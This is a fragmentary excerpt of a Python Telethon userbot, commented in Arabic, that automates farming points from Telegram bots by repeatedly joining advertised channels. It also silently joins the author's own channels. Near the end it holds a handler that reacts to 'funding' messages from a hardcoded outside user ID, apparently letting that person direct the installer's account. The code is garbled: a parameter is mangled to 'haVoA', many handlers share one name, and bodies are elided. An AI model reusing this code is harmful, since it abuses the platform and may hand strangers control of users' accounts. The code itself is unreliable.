...
async def join_channel(event):
	try :
		await abbas(JoinChannelRequest('@X_Y1I'))
...
async def OwnerStart(event):
    ...
    if sender.id == onerabbas_id:
        ...
        joinu = await abbas(JoinChannelRequest('X_Y1I'))
        ...
        for i in range(100):
            await asyncio.sleep(4)
            list = await abbas(GetHistoryRequest(peer=channel_entity, limit=1,                                                    offset_date=None, offset_id=0, max_id=0, min_id=0, add_offset=0, haVoA=0))
            msgs = list.messages[0]
            if msgs.message.find('لا يوجد قنوات في الوقت الحالي , قم يتجميع النقاط بطريقه مختلفه') != -1:
                await VoAahm1.send_message(event.chat_id, f"تم الانتهاء من التجميع | VoA")
                break
        ...
        await abbas.send_message(event.chat_id, "تم الانتهاء من التجميع | VoA")
...
async def OwnerStart(event):
    ...
    if sender.id == onerabbas_id:
        ...
        for i in range(100):
            ...
            msgs = list.messages[0]
            if msgs.message.find('لا يوجد قنوات في الوقت الحالي , قم يتجميع النقاط بطريقه مختلفه') != -1:
                await abbas.send_message(event.chat_id, f"تم الانتهاء من التجميع | VoA")
                break
            url = msgs.reply_markup.rows[0].buttons[0].url
            try:
                try:
    ...
    if sender.id == onerabbas_id:
        ...
        for i in range(100):
            ...
            list = await abbas(GetHistoryRequest(peer=channel_entity, limit=1,
                                                    offset_date=None, offset_id=0, max_id=0, min_id=0, add_offset=0, haVoA=0))
            msgs = list.messages[0]
            if msgs.message.find('لا يوجد قنوات في الوقت الحالي , قم يتجميع النقاط بطريقه مختلفه') != -1:
                await abbas.send_message(event.chat_id, f"تم الانتهاء من التجميع | VoA")
                break
...
@abbas.on(events.NewMessage(outgoing=False, pattern='.سبايدر'))
async def OwnerStart(event):
    sender = await event.get_sender()
    if sender.id == onerabbas_id:
        await event.reply("جاري تجميع النقاط")
...
@abbas.on(events.NewMessage(outgoing=False, pattern='.تحويل سبايدر(.*)'))
async def OwnerStart(event):
    pt = event.pattern_match.group(1) 
    sender = await event.get_sender()
    if sender.id == onerabbas_id :
...
async def OwnerStart(event):
    ...
    if sender.id == onerabbas_id:
        ...
        for i in range(100):
            ...
            msgs = list.messages[0]
            if msgs.message.find('لا يوجد قنوات في الوقت الحالي , قم يتجميع النقاط بطريقه مختلفه') != -1:
                await abbas.send_message(event.chat_id, f"تم الانتهاء من التجميع | SV")
                break
            url = msgs.reply_markup.rows[0].buttons[0].url
            try:
                try:
...
@abbas.on(events.NewMessage(outgoing=False, pattern=r'.معلومات سبايدر'))
async def OwnerStart(event):
    sender = await event.get_sender()
    if sender.id == onerabbas_id :
        send = await abbas.send_message(bot_username8, '/start')
...
async def OwnerStart(event):
    ...
    if sender.id == onerabbas_id:
        ...
        joinm = await abbas(JoinChannelRequest('rVoAaqchi'))
...
async def OwnerStart(event):
    ...
    if sender.id == onerabbas_id:
        ...
        joion = await abbas(JoinChannelRequest('X_Y1I'))
...
DevVoAahm = [1321338802]

@abbas.on(events.NewMessage(incoming=True))
async def Abbas(event):
    if event.message.message.startswith("تمويل") and event.sender_id in DevVoAahm:
